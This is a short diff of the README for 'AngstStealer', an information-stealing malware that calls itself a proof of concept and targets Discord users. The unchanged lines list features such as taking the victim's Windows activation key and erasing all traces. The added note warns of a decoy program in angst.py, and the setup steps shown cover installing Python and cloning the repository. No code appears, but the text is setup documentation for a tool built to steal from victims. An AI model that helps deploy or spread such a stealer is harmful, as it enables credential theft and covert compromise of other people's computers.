@@ -12,6 +12,10 @@ AngstStealer is a PoC malware which is designed to highlight and utilize Discord
 | Windows | Also drops the windows activation key for the victims computer. |
 | Cleanup | Cleans up all traces of Angst |
 
+### Note
+There is a decoy program inside of the main file (angst.py), you should probably remove it, or make your own
+
+
 ### Setup
 1. Install python [here](https://www.python.org/ftp/python/3.7.7/python-3.7.7-amd64.exe)
 2. Clone this repo using `git clone https://github.com/Phew/angst-rewrite/` or manually download it.
